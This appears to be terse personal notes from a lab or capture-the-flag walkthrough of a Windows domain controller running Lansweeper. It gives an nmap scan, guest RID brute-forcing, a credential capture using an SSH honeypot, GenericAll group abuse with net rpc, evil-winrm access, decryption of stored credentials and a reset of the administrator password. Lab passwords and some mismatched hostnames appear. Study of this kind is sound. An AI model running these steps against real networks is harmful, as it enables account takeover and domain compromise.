53/tcp    open  domain        Simple DNS Plus
81/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 0A60C945E674EC7B953429B515519567
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
82/tcp    open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0A60C945E674EC7B953429B515519567
|_ssl-date: TLS randomness does not represent time
| http-title: Lansweeper - Login
|_Requested resource was /login.aspx
| ssl-cert: Subject: commonName=Lansweeper Secure Website
| Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost
| Issuer: commonName=Lansweeper Secure Website
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha512WithRSAEncryption
| Not valid before: 2021-11-21T09:22:27
| Not valid after:  2121-12-21T09:22:27
| MD5:   0a77:f256:6e45:3ce0:dc6b:78e9:a3fc:1bf7
|_SHA-1: 645f:63c0:c4ab:2111:5aa1:f41f:23a3:3791:a45b:78cc
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 09:44:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=inventory.sweep.vl
| Issuer: commonName=inventory.sweep.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-09T09:42:17
| Not valid after:  2027-02-08T09:42:17
| MD5:   a33d:653f:59fc:8380:f1b0:7d0c:2cb8:eb45
|_SHA-1: 7011:318b:1182:b572:1777:e4ef:e466:d264:a842:a087
| rdp-ntlm-info: 
|   Target_Name: SWEEP
|   NetBIOS_Domain_Name: SWEEP
|   NetBIOS_Computer_Name: INVENTORY
|   DNS_Domain_Name: sweep.vl
|   DNS_Computer_Name: inventory.sweep.vl
|   DNS_Tree_Name: sweep.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-10T09:45:27+00:00
|_ssl-date: 2026-08-10T09:46:05+00:00; -27s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
51179/tcp open  msrpc         Microsoft Windows RPC
51192/tcp open  msrpc         Microsoft Windows RPC
55671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55672/tcp open  msrpc         Microsoft Windows RPC
64081/tcp open  msrpc         Microsoft Windows RPC

 netexec smb BREACHDC.breach.vl -u guest -p '' --rid-brute  
 intern user looks nice  
 <img width="876" height="549" alt="image" src="https://github.com/user-attachments/assets/5f76b575-a47f-4d47-84c6-aea379ce1d96" />


port 81 lansweeper  
login using intern:intern  
<img width="1898" height="791" alt="image" src="https://github.com/user-attachments/assets/479bb01c-0d74-4161-8e6f-68f6f2e2d94e" />

setup scanning target
<img width="1065" height="756" alt="image" src="https://github.com/user-attachments/assets/f494c788-6553-4b65-b5c0-6067dfa75c7e" />
On the “Scanning credentials” page, I’ll click the “Map Credential” button, select my IP range and enable all the credentials
<img width="1045" height="502" alt="image" src="https://github.com/user-attachments/assets/fff9e54c-7509-4be2-a32a-e548b13b8056" />

set the sshesame.conf
<img width="421" height="83" alt="image" src="https://github.com/user-attachments/assets/4d04b400-811a-4798-aea1-275ebf509ea3" />

run the scan and wait  "svc_inventory_lnx" with password "0|5m-U6?/uAX"  
0|5m-U6?/uAX
<img width="1043" height="392" alt="image" src="https://github.com/user-attachments/assets/ef0393d2-ed2d-4301-b8cb-9b4f36af7155" />

bloodhound shows svc_inventory_lnx has genericall on to group lan sweeper admins
net rpc group addmem "LANSWEEPER ADMINS" "svc_inventory_lnx%0|5m-U6?/uAX" -U sweep.vl/svc_inventory_lnx%'<REDACTED>' -S sweep.vl  
to check  
net rpc group members "LANSWEEPER ADMINS" -U sweep.cl/svc_inventory_lnx%'0|5m-U6?/uAX' -S sweep.vl

evilwinrm works now
<img width="1125" height="201" alt="image" src="https://github.com/user-attachments/assets/d3f30cee-7420-4126-ae63-49d8d2da590b" />

use lansweeperdecrypt  4^56!sK&}eA?
<img width="1107" height="553" alt="image" src="https://github.com/user-attachments/assets/c454f952-5213-4e91-9b55-33ae89ac8e2d" />  

evilwinrm into svc_inventory_win  
<img width="720" height="243" alt="image" src="https://github.com/user-attachments/assets/5c30040b-0a45-45cc-bb80-d2b4c88a00cd" />

since svc_inventory_win has genericall over administrator
i used rpcclient and changed administators password  
<img width="1372" height="372" alt="image" src="https://github.com/user-attachments/assets/f43c8c12-0999-4dd1-8ba3-7d3f98c4f454" />
<img width="554" height="135" alt="image" src="https://github.com/user-attachments/assets/733fb002-1b56-486a-9c16-1098f2c4fcce" />


